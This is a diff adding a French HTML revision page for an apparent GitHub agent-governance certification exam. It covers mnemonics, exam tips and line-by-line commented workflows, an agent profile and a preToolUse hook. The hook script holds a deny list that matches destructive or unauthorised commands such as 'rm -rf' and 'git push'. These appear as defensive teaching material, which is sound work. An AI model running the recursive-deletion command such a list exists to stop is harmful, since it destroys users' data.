+<li>Les noms imposés sont des classiques : <code>copilot-setup-steps</code>, <code>ready_for_review</code>, <code>.agent.md</code>, <code>copilot-instructions.md</code>.</li>
+<li>Le type de valeur vous guide : un booléen, un nom d'action, une commande shell.</li>
+</ul></div>
+
+<h3>Moyens mnémotechniques</h3>
+<div class="tablewrap"><table><thead><tr><th>Sigle / phrase</th><th>Ce qu'il rappelle</th></tr></thead><tbody>
+<tr><td><strong>P-R-A</strong> : Planifier, Raisonner, Agir</td><td>Trois fonctions à séparer, chacune avec son artefact et son contrôle</td></tr>
+<tr><td><strong>L-E-A</strong> : Lire, Écrire en branche, Approuver</td><td>Autonome, autonome + contrôles, humain (ordre croissant de risque)</td></tr>
+<tr><td><strong>M-P-T-C</strong> : Mécanisme, Privilège minimal, Trace, Contrôle humain ciblé</td><td>Les quatre piliers d'une bonne réponse</td></tr>
+<tr><td><strong>R-O-C-E</strong> : Raisonnement, Outil, Contexte, Environnement</td><td>Les quatre familles de causes racines d'un échec d'agent</td></tr>
+<tr><td><strong>« Check = job »</strong></td><td>Le nom d'un check requis est celui du job</td></tr>
+<tr><td><strong>« Timeout = ouvert, plantage = fermé »</strong></td><td>Hooks : délai dépassé autorise, erreur de commande refuse</td></tr>
+<tr><td><strong>« Deny gagne »</strong></td><td>Un refus l'emporte sur une autorisation</td></tr>
+<tr><td><strong>« Revert, jamais reset »</strong></td><td>Annuler sans réécrire l'histoire</td></tr>
+<tr><td><strong>« env, pas ${{ }} »</strong></td><td>Anti-injection dans <code>run:</code></td></tr>
+<tr><td><strong>« Brouillon, jamais prête »</strong></td><td>Le cloud agent ouvre en brouillon et ne fusionne pas</td></tr>
+</tbody></table></div>
+
+<h3>Chiffres et noms exacts à connaître</h3>
+<div class="tablewrap"><table><thead><tr><th>Élément</th><th>Valeur</th></tr></thead><tbody>
+<tr><td>Score de réussite</td><td>700 / 1000</td></tr>
+<tr><td>Poids des domaines</td><td>1 : 15–20 % · 2 : 20–25 % · 3 : 10–15 % · 4 : 15–20 % · 5 : 15–20 % · 6 : 10–15 %</td></tr>
+<tr><td>Délai par défaut d'un hook</td><td>30 s ; dépassé = autorisé</td></tr>
+<tr><td>Blocages <code>agentStop</code> avant garde-fou</td><td>8</td></tr>
+<tr><td>Fichier d'instructions</td><td><code>.github/copilot-instructions.md</code></td></tr>
+<tr><td>Profils d'agent</td><td><code>.github/agents/*.agent.md</code></td></tr>
+<tr><td>Étapes d'environnement du cloud agent</td><td>job <code>copilot-setup-steps</code> dans <code>.github/workflows/copilot-setup-steps.yml</code></td></tr>
+<tr><td>Branche du cloud agent</td><td><code>copilot/...</code></td></tr>
+<tr><td>Type de secret du cloud agent</td><td><em>Agents</em></td></tr>
+<tr><td>Décision de hook</td><td><code>permissionDecision: "deny"</code> + <code>permissionDecisionReason</code></td></tr>
+<tr><td>Blocage d'arrêt</td><td><code>decision: "block"</code> + <code>reason</code></td></tr>
+<tr><td>Évènement PR</td><td><code>ready_for_review</code></td></tr>
+<tr><td>Nom récent</td><td>Copilot coding agent = <strong>Copilot cloud agent</strong></td></tr>
+</tbody></table></div>
+
+<h3>Vocabulaire français / anglais</h3>
+<div class="tablewrap"><table><thead><tr><th>Français</th><th>English (examen)</th></tr></thead><tbody>
+<tr><td>Garde-fou</td><td>Guardrail</td></tr>
+<tr><td>Humain dans la boucle</td><td>Human in the loop</td></tr>
+<tr><td>Moindre privilège</td><td>Least privilege</td></tr>
+<tr><td>Liste d'autorisation</td><td>Allowlist</td></tr>
+<tr><td>Passation</td><td>Handoff</td></tr>
+<tr><td>Échec ouvert / fermé</td><td>Fail-open / fail-closed</td></tr>
+<tr><td>Cause racine</td><td>Root cause</td></tr>
+<tr><td>Dérive</td><td>Drift</td></tr>
+<tr><td>Plan de contrôle</td><td>Control plane</td></tr>
+<tr><td>Système de référence</td><td>System of record</td></tr>
+<tr><td>Chaîne d'approvisionnement</td><td>Supply chain</td></tr>
+<tr><td>Injection de prompt</td><td>Prompt injection</td></tr>
+<tr><td>Retour arrière</td><td>Rollback</td></tr>
+<tr><td>Observabilité</td><td>Observability</td></tr>
+<tr><td>Traçabilité</td><td>Traceability / auditability</td></tr>
+<tr><td>Fusion (de PR)</td><td>Merge</td></tr>
+</tbody></table></div>
+
+<h3>Astuces par thème</h3>
+<div class="grid">
+<div class="card"><b>SDLC</b><small><ul>
+<li>Plan écrit avant tout code.</li>
+<li>Chaque étape : entrée, sortie, artefact.</li>
+<li>Le plan contient scope, fichiers, risques, tests, rollback.</li>
+<li>Décision métier = humain.</li>
+</ul></small></div>
+<div class="card"><b>Workflows</b><small><ul>
+<li>Nom du check = nom du job.</li>
+<li><code>permissions</code> par job.</li>
+<li>Entrées via <code>env:</code>.</li>
+<li>SHA épinglé, <code>timeout-minutes</code>.</li>
+</ul></small></div>
+<div class="card"><b>Mémoire</b><small><ul>
+<li>Durable = fichier ou artefact.</li>
+<li>Date et source sur chaque fait.</li>
+<li>Conflit de sources : le signaler.</li>
+<li>Jamais de secret en mémoire.</li>
+</ul></small></div>
+<div class="card"><b>MCP</b><small><ul>
+<li>Registre ou allowlist d'organisation.</li>
+<li>Lecture seule, outils énumérés.</li>
+<li>Secret par nom, type Agents.</li>
+<li>Sortie d'outil = donnée non fiable.</li>
+</ul></small></div>
+<div class="card"><b>Politiques et hooks</b><small><ul>
+<li><code>deny</code> avec raison.</li>
+<li>Jamais <code>allow</code> pour sécuriser.</li>
+<li>Hook court (délai = ouvert).</li>
+<li>Politique admin &gt; option CLI.</li>
+</ul></small></div>
+<div class="card"><b>Observabilité</b><small><ul>
+<li>Journal par agent et par lot.</li>
+<li>Identifiant de corrélation.</li>
+<li>Qualitatif <em>et</em> quantitatif.</li>
+<li>Comparer avant / après un changement unique.</li>
+</ul></small></div>
+<div class="card"><b>Autonomie</b><small><ul>
+<li>Lire : autonome.</li>
+<li>Écrire en branche : autonome + checks.</li>
+<li>Fusionner / déployer : humain.</li>
+<li>Secrets / droits : humain seul.</li>
+</ul></small></div>
+<div class="card"><b>Traçabilité</b><small><ul>
+<li>Commits signés, co-auteur.</li>
+<li>Lien vers la session dans la PR.</li>
+<li>Audit log conservé.</li>
+<li>Approbation humaine tracée.</li>
+</ul></small></div>
+<div class="card"><b>Multi-agents</b><small><ul>
+<li>Une branche par agent.</li>
+<li>Passation par artefact.</li>
+<li><code>fail-fast: false</code>.</li>
+<li>Réviseur indépendant + consolidation.</li>
+</ul></small></div>
+</div>
+
+<h3>Le jour de l'examen</h3>
+<div class="box astuce"><b>Gestion du temps et du stress</b><ul>
+<li>Répartissez : ne bloquez pas sur une question, marquez-la et revenez-y.</li>
+<li>Lisez la <strong>dernière phrase</strong> d'abord : « Quelle est la meilleure… », « Quelle est la cause… », « Sélectionnez toutes… ».</li>
+<li>Soulignez mentalement les <strong>contraintes</strong> : « sans ralentir », « moindre privilège », « conforme ».</li>
+<li>Dans un extrait YAML ou un journal, lisez <strong>tout</strong> : l'indice est souvent dans une ligne (nom de job, liste d'outils, SHA, message d'erreur).</li>
+<li>Raisonnez sur le <strong>mécanisme</strong>, pas sur le libellé : les noms de réglages changent.</li>
+<li>Visez 80 % en entraînement pour garder de la marge sur 700 / 1000.</li>
+</ul></div>
+<div class="box piege"><b>Les cinq erreurs les plus fréquentes</b><ul>
+<li>Choisir la réponse « sécurité maximale » qui ignore la contrainte de vitesse.</li>
+<li>Choisir « tout automatiser » sur une action irréversible.</li>
+<li>Confondre instruction (guide) et mécanisme (impose).</li>
+<li>Croire qu'un statut vert, un label ou l'avis de l'agent vaut approbation.</li>
+<li>Oublier que le nom du check est celui du job.</li>
+</ul></div>
+
+<h2>12 · Cas d'usage commentés ligne par ligne</h2>
+<p>Six fichiers complets où <strong>chaque ligne est expliquée</strong> par un commentaire. Lisez d'abord le commentaire, puis la ligne : c'est l'entraînement idéal pour repérer ce qui cloche dans un extrait d'examen.</p>
+
+<h3>Cas G · CI d'une PR d'agent : tests, scan et plan</h3>
+<pre class="code" data-lang="yaml" data-file=".github/workflows/ci-agent.yml"><code># Nom affiché dans l'onglet Actions (≠ nom du check, qui vient du job)
+name: ci-agent
+
+# Quand le workflow se déclenche
+on:
+  # Sur chaque PR dont la cible est main
+  pull_request:
+    branches:
+      - main
+    # Ces types couvrent ouverture, nouveaux commits et passage en « prête »
+    types:
+      - opened
+      - synchronize
+      - ready_for_review
+  # Indispensable pour que le check s'exécute aussi dans la file de fusion
+  merge_group:
+
+# Droits par défaut du jeton pour TOUS les jobs : lecture seule
+permissions:
+  contents: read
+
+# Évite deux exécutions simultanées pour la même PR
+concurrency:
+  # Un groupe par workflow et par référence (branche de la PR)
+  group: ci-agent-${{ github.ref }}
+  # Une nouvelle exécution annule l'ancienne devenue inutile
+  cancel-in-progress: true
+
+jobs:
+  # Le nom de CE job est le nom du check à exiger dans le ruleset
+  verifier:
+    # Machine virtuelle hébergée par GitHub
+    runs-on: ubuntu-latest
+    # Coupe le job s'il boucle (agent ou test bloqué)
+    timeout-minutes: 15
+    steps:
+      # Récupère le code de la PR (action officielle)
+      - uses: actions/checkout@v4
+
+      # Installe Node et active le cache des dépendances
+      - uses: actions/setup-node@v4
+        with:
+          # Version imposée : même environnement qu'en local
+          node-version: "20"
+          # Accélère les exécutions suivantes
+          cache: npm
+
+      # Installation reproductible depuis le lockfile (échoue s'il diverge)
+      - run: npm ci
+
+      # Analyse statique : détecte les erreurs avant les tests
+      - run: npm run lint
+
+      # Tests : une preuve, pas une approbation
+      - run: npm test
+
+      # Audit des dépendances : échoue à partir du niveau « high »
+      - run: npm audit --audit-level=high
+
+      # Étape nommée pour être lisible dans les journaux
+      - name: Vérifier la présence du plan
+        # Entrée externe passée par env (anti-injection)
+        env:
+          PR_BRANCH: ${{ github.head_ref }}
+        # Bloc shell multiligne
+        run: |
+          # Le plan doit exister, sinon la PR est refusée
+          test -f .github/agent-plans/implementation-plan.md
+          # Il doit contenir la section « Rollback »
+          grep -q "## Rollback" .github/agent-plans/implementation-plan.md
+          # Message utile dans le journal
+          echo "Plan présent pour la branche $PR_BRANCH"</code></pre>
+<p><strong>Ce qu'il faut retenir.</strong> Un seul job, un nom clair pour le check requis ; lecture seule ; <code>merge_group</code> ; <code>timeout-minutes</code> ; scans et plan <em>vérifiés par un mécanisme</em>.</p>
+
+<h3>Cas H · Environnement du cloud agent</h3>
+<pre class="code" data-lang="yaml" data-file=".github/workflows/copilot-setup-steps.yml"><code># Nom libre du workflow
+name: Copilot Setup Steps
+
+# Déclencheurs
+on:
+  # Lancement manuel pour tester la préparation
+  workflow_dispatch:
+  # Vérifie le fichier quand on le modifie, sur push...
+  push:
+    paths:
+      - .github/workflows/copilot-setup-steps.yml
+  # ...et sur pull request
+  pull_request:
+    paths:
+      - .github/workflows/copilot-setup-steps.yml
+
+jobs:
+  # NOM IMPOSÉ : Copilot cherche exactement ce job
+  copilot-setup-steps:
+    runs-on: ubuntu-latest
+    # Moindre privilège : lecture du dépôt uniquement
+    permissions:
+      contents: read
+    # Borne la préparation
+    timeout-minutes: 20
+    steps:
+      # Sans checkout, le code n'est pas disponible pour npm ci
+      - name: Checkout code
+        uses: actions/checkout@v4
+
+      # Runtime Node pour le projet
+      - name: Set up Node.js
+        uses: actions/setup-node@v4
+        with:
+          node-version: "20"
+          cache: npm
+
+      # Dépendances installées une fois, prêtes pour l'agent
+      - name: Install dependencies
+        run: npm ci
+
+      # Navigateur pour les tests de bout en bout
+      - name: Install browser tools
+        run: npx playwright install --with-deps chromium</code></pre>
+<p><strong>Ce qu'il faut retenir.</strong> Le nom du job est un contrat ; l'agent démarre avec tout installé (plus rapide) ; aucun secret ni droit d'écriture nécessaire.</p>
+
+<h3>Cas I · Profil d'agent en lecture seule, commenté</h3>
+<pre class="code" data-lang="md" data-file=".github/agents/analyste-securite.agent.md"><code>---
+# Identifiant de l'agent, visible dans le sélecteur
+name: analyste-securite
+# Une phrase qui dit QUAND l'utiliser (sert au choix automatique)
+description: Analyse une PR et signale les risques de sécurité, sans modifier le code.
+# Liste blanche d'outils : ce qui n'est pas listé n'existe pas pour l'agent
+tools:
+  # Lire des fichiers
+  - read
+  # Chercher dans le dépôt
+  - search
+  # Appeler un outil précis du serveur MCP « github »
+  - github/list_pull_request_files
+# Serveurs MCP embarqués avec ce profil
+mcp-servers:
+  # Nom local du serveur
+  github:
+    # Transport HTTP
+    type: http
+    # Variante lecture seule du serveur
+    url: https://api.githubcopilot.com/mcp/readonly
+    # Seuls ces outils sont exposés (liste d'autorisation)
+    tools:
+      - list_pull_request_files
+---
+
+# Rôle
+Tu analyses les changements d'une PR et tu identifies les risques de sécurité.
+
+## Ce que tu fais
+- Tu lis les fichiers modifiés (cohérent avec l'outil `read`).
+- Tu cherches les secrets, injections et permissions trop larges.
+
+## Ce que tu ne fais jamais
+- Tu ne modifies aucun fichier (l'outil `edit` n'est pas donné).
+- Tu n'approuves ni ne fusionnes la PR.
+
+## Sortie attendue
+- Un rapport `sortie/securite.md` avec chaque risque, son chemin, sa gravité.</code></pre>
+<p><strong>Ce qu'il faut retenir.</strong> Dans l'en-tête, chaque clé a un rôle précis : <code>tools</code> = capacités, <code>mcp-servers</code> = sources externes. La contrainte « ne modifie rien » est <em>garantie</em> par l'absence de <code>edit</code>, la section texte ne fait que l'expliquer.</p>
+
+<h3>Cas J · Script de hook <code>preToolUse</code></h3>
+<pre class="code" data-lang="sh" data-file=".github/hooks/pre-tool-use.sh"><code>#!/usr/bin/env bash
+# Interpréteur : bash, pour utiliser [[ ]] et les tableaux
+set -euo pipefail
+# -e : s'arrête à la première erreur (un plantage = refus, fail-closed)
+# -u : variable non définie = erreur
+# -o pipefail : une erreur dans un pipe n'est pas masquée
+
+# Lit tout le JSON envoyé par l'agent sur l'entrée standard
+input=$(cat)
+
+# Extrait le nom de l'outil demandé (ex. bash, edit)
+tool=$(echo "$input" | jq -r '.toolName')
+
+# Extrait la commande shell, vide si ce n'est pas un appel bash
+cmd=$(echo "$input" | jq -r '.toolArgs.command // empty')
+
+# Extrait le chemin visé par une édition, vide sinon
+path=$(echo "$input" | jq -r '.toolArgs.path // empty')
+
+# Fonction : écrit la décision de refus au format attendu
+deny() {
+  # Doit contenir decision ET raison (la raison est obligatoire)
+  printf '{"permissionDecision":"deny","permissionDecisionReason":"%s"}\n' "$1"
+  # Sortie 0 : la réponse JSON est lue normalement
+  exit 0
+}
+
+# Règle 1 : jamais de push depuis l'agent
+if [[ "$tool" == "bash" &amp;&amp; "$cmd" == *"git push"* ]]; then
+  deny "git push interdit : passer par la PR"
+fi
+
+# Règle 2 : jamais de suppression récursive
+if [[ "$tool" == "bash" &amp;&amp; "$cmd" == *"rm -rf"* ]]; then
+  deny "Suppression récursive interdite"
+fi
+
+# Règle 3 : écriture autorisée seulement dans sortie/
+if [[ "$tool" == "edit" &amp;&amp; "$path" != sortie/* ]]; then
+  deny "Écriture hors sortie/ interdite"
+fi
+
+# Aucune objection : réponse vide, on laisse l'approbation normale décider
+echo '{}'</code></pre>
+<p><strong>Ce qu'il faut retenir.</strong> Le script lit une entrée, applique des règles <strong>déterministes</strong> et ne renvoie jamais <code>allow</code>. Il doit rester rapide (délai dépassé = autorisé). Une erreur de script = refus.</p>
+
+<h3>Cas K · Déploiement avec contrôle de santé et rollback</h3>
+<pre class="code" data-lang="yaml" data-file=".github/workflows/deploy-prod.yml"><code>name: deploy-prod
+
+# Déclenché à la main uniquement : pas de déploiement implicite
+on:
+  workflow_dispatch:
+    # Paramètre saisi par l'opérateur
+    inputs:
+      version:
+        description: Tag ou SHA à déployer
+        required: true
+
+# Lecture seule par défaut
+permissions:
+  contents: read
+
+# Un seul déploiement à la fois, sans annulation en cours
+concurrency:
+  group: deploy-prod
+  cancel-in-progress: false
+
+jobs:
+  deployer:
+    runs-on: ubuntu-latest
+    # Environnement protégé : approbateur humain avant que le job démarre
+    environment: production
+    # Variables d'entrée sûres (jamais ${{ }} dans run)
+    env:
+      VERSION: ${{ inputs.version }}
+      # Secret propre à l'environnement production
+      DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
+    steps:
+      # Récupère exactement la version demandée
+      - uses: actions/checkout@v4
+        with:
+          ref: ${{ inputs.version }}
+
+      # Publie la version
+      - name: Déployer
+        run: ./scripts/deploy.sh "$VERSION"
+
+      # Contrôle de santé : une preuve que le service répond
+      - name: Vérifier la santé
+        id: sante
+        run: |
+          # 10 tentatives espacées de 6 s (retry borné)
+          for i in $(seq 1 10); do
+            # -f : échec si code HTTP &gt;= 400
+            curl -fsS https://app.example.com/health &amp;&amp; exit 0
+            sleep 6
+          done
+          # Après 10 échecs : le step échoue
+          exit 1
+
+      # Ne s'exécute que si une étape précédente a échoué
+      - name: Rollback vers la version saine
+        if: failure()
+        # Redéploie le dernier SHA connu sain (pas de reset ni de force-push)
+        run: ./scripts/deploy.sh "$(cat .last-good-sha)"</code></pre>
+<p><strong>Ce qu'il faut retenir.</strong> L'humain intervient <em>à un seul endroit</em> (l'environnement), le reste est automatique : déploiement, preuve de santé, retour arrière. Retry borné, secret isolé, aucune réécriture d'historique.</p>
+
+<h3>Cas L · Porte de PR : issue liée et commits signés</h3>
+<pre class="code" data-lang="yaml" data-file=".github/workflows/pr-gate.yml"><code>name: pr-gate
+
+on:
+  pull_request:
+    branches:
+      - main
+
+# Lecture des PR nécessaire pour interroger l'API
+permissions:
+  contents: read
+  pull-requests: read
+
+jobs:
+  # Check requis : nom du job
+  pr-gate:
+    runs-on: ubuntu-latest
+    env:
+      # Jeton fourni par GitHub, limité par les permissions ci-dessus
+      GH_TOKEN: ${{ github.token }}
+      # Numéro de PR transmis comme variable (pas d'injection)
+      PR_NUMBER: ${{ github.event.pull_request.number }}
+      # Dépôt courant (propriétaire/nom)
+      REPO: ${{ github.repository }}
+    steps:
+      # Vérifie que la PR référence une issue (traçabilité du besoin)
+      - name: Issue liée
+        run: |
+          # Récupère le corps de la PR au format brut
+          body=$(gh pr view "$PR_NUMBER" --repo "$REPO" --json body -q .body)
+          # Cherche « Closes #123 » ou « Fixes #123 »
+          echo "$body" | grep -Eiq '(closes|fixes|resolves) #[0-9]+' \
+            || { echo "::error::Aucune issue liée (Closes #N)"; exit 1; }
+
+      # Vérifie que tous les commits sont signés (auteur vérifié)
+      - name: Commits signés
+        run: |
+          # Liste les commits de la PR avec leur statut de vérification
+          unsigned=$(gh api "repos/$REPO/pulls/$PR_NUMBER/commits" \
+            --jq '[.[] | select(.commit.verification.verified == false)] | length')
+          # Échoue si au moins un commit n'est pas vérifié
+          [ "$unsigned" -eq 0 ] \
+            || { echo "::error::$unsigned commit(s) non signé(s)"; exit 1; }
+
+      # Vérifie qu'aucun fichier sensible n'est touché sans revue dédiée
+      - name: Fichiers de gouvernance
+        run: |
+          # Fichiers modifiés par la PR
+          files=$(gh pr view "$PR_NUMBER" --repo "$REPO" --json files -q '.files[].path')
+          # Si un fichier d'agent ou de workflow change, on le signale
+          if echo "$files" | grep -Eq '^\.github/(agents|workflows)/'; then
+            echo "::notice::Gouvernance modifiée : revue des Code Owners obligatoire"
+          fi</code></pre>
+<p><strong>Ce qu'il faut retenir.</strong> Trois preuves automatiques : <strong>besoin</strong> (issue), <strong>auteur</strong> (commits signés), <strong>gouvernance</strong> (CODEOWNERS). Aucune ne remplace la revue humaine : elles la rendent plus rapide et plus fiable.</p>
+
+<div class="box astuce"><b>Méthode pour lire un YAML d'examen</b><ol>
+<li><strong>Déclencheurs</strong> (<code>on</code>) : bons évènements, bonne branche ?</li>
+<li><strong>Droits</strong> (<code>permissions</code>) : minimaux, par job ?</li>
+<li><strong>Nom du job</strong> : correspond-il au check requis ?</li>
+<li><strong>Entrées externes</strong> : via <code>env:</code> ?</li>
+<li><strong>Étapes</strong> : y a-t-il une preuve (test, scan, santé) ?</li>
+<li><strong>Humain</strong> : placé uniquement sur l'irréversible (<code>environment</code>) ?</li>
+<li><strong>Retour arrière</strong> : revert ou SHA sain, jamais de réécriture ?</li>
+</ol></div>
+
+<h2>Mini-fiche : quoi vérifier dans un YAML d'examen</h2>
+<div class="tablewrap"><table><thead><tr><th>Élément</th><th>Question à se poser</th></tr></thead><tbody>
+<tr><td><code>permissions:</code></td><td>Moindre privilège ? Écriture seulement dans le job qui en a besoin ?</td></tr>
+<tr><td><code>on:</code></td><td>Bons événements/types (<code>ready_for_review</code>, <code>merge_group</code>) ? Branche cible ?</td></tr>
+<tr><td>Nom du job</td><td>Égal au check requis ? Égal à <code>copilot-setup-steps</code> ?</td></tr>
+<tr><td><code>${{ }}</code> dans <code>run:</code></td><td>Injection de commande : passer par <code>env:</code></td></tr>
+<tr><td><code>uses:</code></td><td>Action tierce épinglée par SHA ?</td></tr>
+<tr><td><code>tools:</code> / MCP</td><td>Outils listés ? Cohérence agent ↔ serveur ? Lecture seule ?</td></tr>
+<tr><td>CODEOWNERS + ruleset</td><td>Chemins sensibles couverts ? Revue Code Owners exigée ? Contournement désactivé ?</td></tr>
+<tr><td>Hook</td><td>Délai, code de sortie, <code>deny</code> avec raison, jamais <code>allow</code></td></tr>
+</tbody></table></div>
+
+<div class="pager"><a href="09-fiche-memo.html"><small>← Précédent</small>Fiche mémo</a><a class="n" href="index.html"><small>Retour →</small>Accueil révisions</a></div>
+<footer>Révisions GH-600 · SprintDesk · HabiOuest (cas fictif)</footer>
+</main></div><script src="assets/highlight.js"></script></body></html>
